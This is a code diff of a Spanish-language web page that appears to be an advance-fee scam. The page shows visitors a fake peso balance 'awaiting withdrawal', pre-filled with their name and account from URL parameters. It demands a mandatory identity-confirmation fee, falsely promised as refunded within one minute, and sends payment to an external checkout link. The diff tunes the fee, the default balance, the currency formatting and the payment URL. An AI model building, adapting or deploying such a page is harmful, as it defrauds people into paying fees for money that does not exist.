@@ -376,7 +376,7 @@ html[data-vsl=sem] #vsl-below[hidden]{display:block!important}
 
     <section class="bal-card" aria-label="Saldo disponible">
       <div class="bal-sub">Saldo disponible · MXN</div>
-      <div class="bal-num" id="topBalance">MX$0.00</div>
+      <div class="bal-num" id="topBalance">$0,00 MXN</div>
       <div class="bal-wait">
         <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><path d="M12 6v6l4 2"></path></svg>
         Esperando la confirmación del retiro
@@ -406,12 +406,12 @@ html[data-vsl=sem] #vsl-below[hidden]{display:block!important}
       <section class="card">
         <div class="sec-label">Confirmación de identidad</div>
         <div class="fee-row">
-          <div class="fee-amount">MX$392.43</div>
+          <div class="fee-amount">$197,00 MXN</div>
           <span class="badge">Monto reembolsable</span>
         </div>
         <p class="fee-copy">
-          Comisión obligatoria para liberar el retiro de <strong id="balanceText">MX$0.00</strong>.
-          El monto de <strong>MX$392.43</strong> se te reembolsa completo en 1 minuto.
+          Comisión obligatoria para liberar el retiro de <strong id="balanceText">$0,00 MXN</strong>.
+          El monto de <strong>$197,00 MXN</strong> se te reembolsa completo en 1 minuto.
         </p>
       </section>
 
@@ -421,7 +421,7 @@ html[data-vsl=sem] #vsl-below[hidden]{display:block!important}
           <div class="row"><span class="k">Nombre</span><span class="v" id="nameVal">—</span></div>
           <div class="row"><span class="k">Fecha</span><span class="v" id="dateVal">—</span></div>
           <div class="row"><span class="k">Cuenta</span><span class="v" id="methodVal">—</span></div>
-          <div class="row"><span class="k">Monto a recibir</span><span class="v bold" id="amountVal">MX$0.00</span></div>
+          <div class="row"><span class="k">Monto a recibir</span><span class="v bold" id="amountVal">$0,00 MXN</span></div>
         </div>
         <div class="account-box" id="accountBox">—</div>
       </section>
@@ -433,7 +433,7 @@ html[data-vsl=sem] #vsl-below[hidden]{display:block!important}
             <div class="step-num pink">1</div>
             <div class="step-body">
               <div class="step-title">Paga la comisión de confirmación</div>
-              <div class="step-sub">MX$392.43 para verificar tu identidad</div>
+              <div class="step-sub">$197,00 MXN para verificar tu identidad</div>
             </div>
           </div>
           <div class="step">
@@ -447,7 +447,7 @@ html[data-vsl=sem] #vsl-below[hidden]{display:block!important}
             <div class="step-num pink">3</div>
             <div class="step-body">
               <div class="step-title">Accede a tu saldo completo</div>
-              <div class="step-sub" id="step3Sub">MX$0.00 liberados para retiro</div>
+              <div class="step-sub" id="step3Sub">$0,00 MXN liberados para retiro</div>
             </div>
           </div>
         </div>
@@ -483,10 +483,12 @@ html[data-vsl=sem] #vsl-below[hidden]{display:block!important}
   (function () {
     var params = new URLSearchParams(window.location.search);
     var total = parseFloat(params.get('total'));
-    if (isNaN(total) || total <= 0) total = 17131.75;
+    if (isNaN(total) || total <= 0) total = 9870.20;
 
     function money(v) {
-      return 'MX$' + v.toFixed(2).replace(/\B(?=(\d{3})+(?!\d))/g, ',');
+      var parts = Number(v).toFixed(2).split('.');
+      parts[0] = parts[0].replace(/\B(?=(\d{3})+(?!\d))/g, '.');
+      return '$' + parts[0] + ',' + parts[1] + ' MXN';
     }
 
     var name = params.get('name') || '—';
@@ -507,7 +509,7 @@ html[data-vsl=sem] #vsl-below[hidden]{display:block!important}
     document.getElementById('methodVal').textContent = method;
     document.getElementById('accountBox').textContent = account;
 
-    var CHECKOUT_URL = 'https://checkout.vendepay.com/2536798a-3eb6-4b0f-a8aa-0bb7f10318ed';
+    var CHECKOUT_URL = 'https://xpag.global/pay/dmaiiZro';
 
     document.getElementById('payBtn').addEventListener('click', function () {
       var url;
